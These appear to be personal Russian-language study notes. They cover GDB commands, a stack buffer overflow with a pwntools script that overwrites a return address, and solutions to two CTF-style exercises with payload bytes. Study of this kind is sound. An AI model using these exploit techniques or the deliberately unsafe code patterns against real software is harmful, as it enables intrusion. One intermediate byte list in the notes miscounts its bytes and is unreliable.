# GDB
- компил с флагом -o
gcc -g -o program program.c

- запуск без лишней инфы
gdb -q program 

- запуск программы
r arg1 arg

- остановы
break main / i b (info breakpoints) / delete N (delete N breakpoints)

- следующий шаг или выполнение до следующей останова
s или с

- значение переменной или выражения
print x / p

- цепочка вызовов функций сверху вниз
bt/backtrace

- Cтек вызовов вместе со значениями всех локальных переменных для каждого фрейма
bt full

- quit
q

- вывод ассемблерного кода функции или диапазона адресов
disas или disassemble

- все отображенные регионы памяти (Start Addr, End Addr, Size, смещение и файл/сегмент вроде `[stack]`, `[heap]`)
info proc mappings

- Сохранить всю память процесса в файл
dump binary memory output.bin <start_addr> <end_addr>

- Дамп всей памяти в файл
generate-core-file

- info
info files - выводит информацию о текущем исполняемом файле, его секциях (например, `.text`, `.data`) и адресах памяти
info registers - просмотр содержимого регистров процессора
info locals - показывает значения всех локальных переменных в текущем стековом фрейме
info args - выводит аргументы, которые были переданы в текущую функцию
info functions/func - выводит список имен и типов всех определенных в программе функций (можно использовать регулярные выражения для фильтрации)
info variables - показывает список всех глобальных и статических переменных.

- **`x`** (examine) - позволяет исследовать память
    **`x/[количество][формат][размер] [адрес]`**
        • По размеру данных (размер):
            • b — байт (Byte, 1 байт)
            • h — полуслово (Halfword, 2 байта)
            • w — слово (Word, 4 байта) — по умолчанию для чисел
            • g — гигантское слово (Giant word, 8 байт)
        • По типу отображения (формат):
            • x — шестнадцатеричный (Hex)
            • d — десятичный со знаком (Decimal)
            • u — десятичный без знака (Unsigned)
            • c — одиночный символ (Char)
            • s — строка (строка с нуль-терминатором в конце)
            • i — инструкция процессора (дисассемблировать этот участок)
        ПРИМЕР: **`x/s 0x402004`** - вывести строку, которая записана в 0x402004
# Buffer Overflow
```c
#include <stdio.h>

int Foo(){
        puts("Hello y flag\n");
}

int main(void){
        char buf[32] = {0};
        puts("Hello, input y string: \n");
        gets(buf);
}
```

gcc -g -no-pie -fno-stack-protector -Wall -std=c89 pwn.c
gdb -q ./a.out

i func
All defined functions:
File pwn.c:
3: int Foo();
7: int main(void);
Non-debugging symbols:
...

p &Foo
```gdb
$1 = (int (*)()) 0x401136 <Foo>
```

```python
from pwn import *
context.arch = 'amd64' #утснаовка целевой архитектуры
Foo = 0x401136 #адрес функции в программе
offset = 40 #сколько байт мы отправляем (смещение)
p = process('./a.out') #заруск программы локально
p.recvuntil(b'input y string: \n') #b перед строковым литералом создает объект типа bytes. recvuntil читает stdout до указаной строки
payload = b'A' * offset + p64(Foo) #упаковывает адрес или значение Foo в 64-битный формат байтов с порядком от младшего к старшему, чтобы программа прочитала его как адрес возврата
p.sendline(payload) #отправка пейлода в процесс (добавляет \n)
p.interactive() #передача управления пользователю
```

RBP (Base Pointer) - базовый указатель. Он указывает на начало текущей области стека, выделенной для вызываемой функции. Всегда занимает 8 байт

низкие адреса (начало буфера)
┌──────────────────────────────────────┐
│  Буфер (Buffer)                      │  32 байта
└──────────────────────────────────────┘
┌──────────────────────────────────────┐
│  Сохраненный RBP (Saved RBP)         │  8 байт
└──────────────────────────────────────┘ <--- Конец offset (32 + 8 = 40)
┌──────────────────────────────────────┐
│  Адрес возврата (Return Address/RIP) │  Сюда ложится p64(Foo)
└──────────────────────────────────────┘
высокие адреса

# Standard Binary Exploitation
№1
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
 if(argc<2){
  printf("Pass argv[1] a number\n");
  return 0;
 }
 int fd = atoi( argv[1] ) - 0x1234;
 int len = 0;
 len = read(fd, buf, 32);
 if(!strcmp("LETMEWIN\n", buf)){
  printf("Congratulations! Yout flag is:)\n");
  setregid(getegid(), getegid());
  system("/bin/cat flag");
  exit(0);
 }
 printf("Learn about Linux file IO\n");
 return 0;
}
``` 

В аргумент нужно передать число, в fd оно записывается по правилу:  
```c
atoi( argv[1] ) - 0x1234;
```
Где atoi() - функция преобразования ascii-текста в число.  

read(fd, buf, 32) - системный вызов Linux.  
Первый параметр - из какого файлового дескриптора берём информацию.  
Второй параметр - куда записываем.  
Третий параметр - сколько записываем.  
Возвратное значение - количество реально записанных данных.  

strcmp(a, b) - сравнение строк.  
Возвратное значение - 0, если строки совпадают  
  
То есть нам нужно записать такое число в аргумент, чтобы в fd было 0 (чтение из stdin) и в stdin записать "LETMEWIN\n". 0x1234 в decimal 4660 (потому что atoi работает с decimal int). Значит в аргумент надо передать 4660

№2
collision
тяжело
```c
#include <stdio.h>
#include <string.h> 
#include <stdlib.h> //подключил сам
#include <unistd.h> //подключил сам
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
 int* ip = (int*)p;
 int i;
 int res=0;
 for(i=0; i<5; i++){
  res += ip[i];
 }
 return res;
}

int main(int argc, char* argv[]){
 if(argc<2){
  printf("Usage : %s [passcode]\n", argv[0]);
  return 0;
 }
 if(strlen(argv[1]) != 20){
  printf("Passcode length should be 20 bytes\n");
  return 0;
 }

 if(hashcode == check_password( argv[1] )){
  setregid(getegid(), getegid());
  system("/bin/cat flag");
  return 0;
 }
 else
  printf("Wrong passcode.\n");
 return 0;
}
```
длина пароля должна быть 20 (20 байт информации). По сути мы должны найти хэш по функции которая нам дана  
  
p - указатель на начало массива char  
ip - указатель на тот же массив но только это как-будто массив int, значит размер шага для массива теперь равен 4 байта (sizeof(int))  
четыре элемента char преобразуются в один элемент int, участки памяти "склеиваются" (разобрался с этим по этой картинке)  
![[photo_2026-11-12_18-23-14.jpg]]
  
то есть нам надо ввести такую строку которая при преобразовании в 4 элемента int и их сложения даст 0x21DD09EC (568134124). Подберём такое число: 568134124//5=113 626 824 (06C5 CEC8)  
  
получается, что заслать надо такую последовательность байт: 06 C5 CE C8 06 C5 CE C8 06 C5 CE C8 06 C5 CE C8 06 C5 CE C8 06 C5 CE CC (+4). Как раз 20 символов если разбивать по парам, но в ascii нет таких кодов, надо попробовать заслать в виде последовательности байт: \x06\xc5\xce\xc8\x06\xc5\xce\xc8\x06\xc5\xce\xc8\x06\xc5\xce\xc8\x06\xc5\xce\xcс. Аргументы программа читает в виде массива char, который ограничен до 0x100 (256 значений), поэтому никакой байт не пострадает, все элементы просто будут успешно записаны в массив (не факт, что можно будет прочитать в ascii или другой кодировке, они просто будут храниться как значения в памяти)

а, ну да так как сборка байтов происходит в little-endian формате перевернём все байты: \xcc\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06

два варианта записи:
```python
import subprocess

payload = b"\xcc\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06"
subprocess.run(["./a.out", payload])
```
```bash
./a.out "$(printf '\xcc\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06')"
```
№3